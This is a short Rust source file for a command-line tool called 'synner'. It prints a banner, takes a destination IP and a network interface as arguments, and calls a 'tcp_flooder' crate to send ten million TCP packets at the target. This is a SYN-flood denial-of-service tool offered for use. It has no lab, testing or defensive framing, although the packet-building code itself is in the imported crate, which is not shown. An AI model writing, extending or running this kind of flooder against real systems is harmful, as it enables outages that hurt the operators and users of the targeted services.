extern crate rand;
extern crate colored;
extern crate pnet;
extern crate tcp_flooder;
extern crate pnet_base;
extern crate pnet_packet;
extern crate pnet_datalink;
extern crate pnet_transport;

use tcp_flooder::tcp::packet::{send_tcp_packets};

use std::env;
use std::net::{Ipv4Addr};

use colored::*;

fn print_logo() {
    println!("{}", format!(" ________  ___     ___    ___ ___   ___      ________  _______   ___      ___ \n|\\   __  \\|\\  \\   |\\  \\  /  /|\\  \\ |\\  \\    |\\   ___ \\|\\  ___ \\ |\\  \\    /  /|\n\\ \\  \\|\\  \\ \\  \\  \\ \\  \\/  / | \\  \\\\_\\  \\   \\ \\  \\_|\\ \\ \\   __/|\\ \\  \\  /  / /\n \\ \\   ____\\ \\  \\  \\ \\    / / \\ \\______  \\   \\ \\  \\ \\\\ \\ \\  \\_|/_\\ \\  \\/  / / \n  \\ \\  \\___|\\ \\  \\  /     \\/   \\|_____|\\  \\ __\\ \\  \\_\\\\ \\ \\  \\_|\\ \\ \\    / /  \n   \\ \\__\\    \\ \\__\\/  /\\   \\          \\ \\__\\\\__\\ \\_______\\ \\_______\\ \\__/ /   \n    \\|__|     \\|__/__/ /\\ __\\          \\|__\\|__|\\|_______|\\|_______|\\|__|/    \n                  |__|/ \\|__|").purple());
}

fn print_help() {
    println!("{}",format!("[-] Usage: ./synner destination_ip interface_name").red());
}

fn parse_arguments() -> Result<(Ipv4Addr, String), &'static str>{
    let args: Vec<String> = env::args().collect();

    if args.len() != 3 {
        print_help();
        panic!();
    }

    let destination_ip = args[1].parse::<Ipv4Addr>().unwrap();
    let interface = args[2].to_string();
    
    Ok((destination_ip, interface))
}


fn main() {
    print_logo();

    let parsed_args = parse_arguments().unwrap();

    let count = 10000000;

    send_tcp_packets(parsed_args.0, parsed_args.1, count);  

    println!("{}",format!("[+] Sent {} packet(s)", &count).green());
}
